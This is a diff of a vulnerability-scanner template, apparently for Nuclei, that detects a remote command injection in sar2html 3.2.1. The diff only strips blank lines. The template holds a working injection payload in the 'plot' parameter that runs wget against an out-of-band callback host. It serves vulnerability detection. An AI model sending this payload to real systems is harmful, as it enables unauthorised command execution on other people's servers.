@@ -1,5 +1,4 @@
 id: sar2html-rce
-
 info:
   name: sar2html 3.2.1 - Remote Command Injection
   author: gy741
@@ -13,14 +12,12 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: sar2html,rce,oast
-
 requests:
   - raw:
       - |
         GET /index.php?plot=;wget%20http://{{interactsh-url}} HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
-
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the HTTP Interaction
